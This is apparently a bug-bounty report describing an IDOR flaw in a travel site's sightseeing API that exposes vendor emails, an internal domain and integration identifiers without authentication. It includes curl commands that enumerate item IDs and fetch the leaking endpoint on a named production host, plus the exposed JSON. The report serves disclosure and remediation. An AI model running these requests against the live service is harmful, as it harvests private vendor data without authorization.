# HIGH-02: Unauthenticated Sightseeing Vendor PII + Internal Email Disclosure via IDOR

## Severity: HIGH
**CVSS**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**Reward Estimate**: USD 160–450

## Summary
The `GET /api/v1/sightseeing/{id}` endpoint returns the full vendor user profile object without authentication. This exposes: vendor email addresses (including internal service account email `gyg-vendor@yatra.internal`), internal user role, account status, and internal `rawPayload` containing third-party integration identifiers. The internal domain `yatra.internal` is disclosed through the vendor email field.

## Reproduction Steps

1. Enumerate sightseeing items from the public search endpoint (no auth):
```
GET https://api.yatraforfun.com/api/v1/sightseeing/search
```

2. Access any sightseeing item by UUID:
```
GET https://api.yatraforfun.com/api/v1/sightseeing/117f1bfd-370c-45ed-a8c8-32133e094344
```

## Proof of Concept — curl

```bash
# Step 1: Get sightseeing IDs (no auth)
curl -s "https://api.yatraforfun.com/api/v1/sightseeing/search" | python3 -c "import sys,json; [print(h['id']) for h in json.load(sys.stdin)['data']['data'][:3]]"

# Step 2: Access detail endpoint (no auth) — vendor object + rawPayload exposed
curl -sk "https://api.yatraforfun.com/api/v1/sightseeing/117f1bfd-370c-45ed-a8c8-32133e094344"
```

### Response (sensitive fields):
```json
{
  "data": {
    "rawPayload": {
      "slug": "whoppie-land-water-park-day-pass-transfer",
      "gyg_id": "1297805",
      "gyg_row_id": "2b941e00-91d6-4b37-9bbf-46989aa79023"
    },
    "vendor": {
      "id": "a8ae4a7e-bdbb-4621-890e-8171e48097a7",
      "tenantId": "46990d25-d7c0-4a0e-b42b-5d233b0603a9",
      "userType": "staff",
      "email": "gyg-vendor@yatra.internal",
      "isActive": true,
      "approvalStatus": "approved",
      "createdViaIp": null,
      "createdViaUserAgent": null,
      "deletedAt": null
    }
  }
}
```

## Impact
- **Internal Domain Disclosure**: Email `gyg-vendor@yatra.internal` reveals the internal domain `yatra.internal` — useful for internal infrastructure mapping
- **Vendor PII Exposure**: Vendor ID, role, internal email, account status exposed to all unauthenticated users
- **Internal ID Leak**: `rawPayload` field exposes internal GetYourGuide identifiers (`gyg_row_id`) that are not meant to be public
- **Same Root Cause as HIGH-01**: The systemic issue affects hotels, sightseeing, and potentially other resource types

## Root Cause
Same as HIGH-01: detail endpoints eagerly load related user objects (owner/vendor) and return the full user DTO without stripping sensitive fields. No authentication is required.

## Remediation
1. Require authentication for `/api/v1/sightseeing/{id}`, OR
2. Strip vendor object from unauthenticated responses
3. Remove `rawPayload` field from public API responses entirely
4. Fix systemically: apply this to all resource types (hotels, sightseeing, apartments, vehicles)
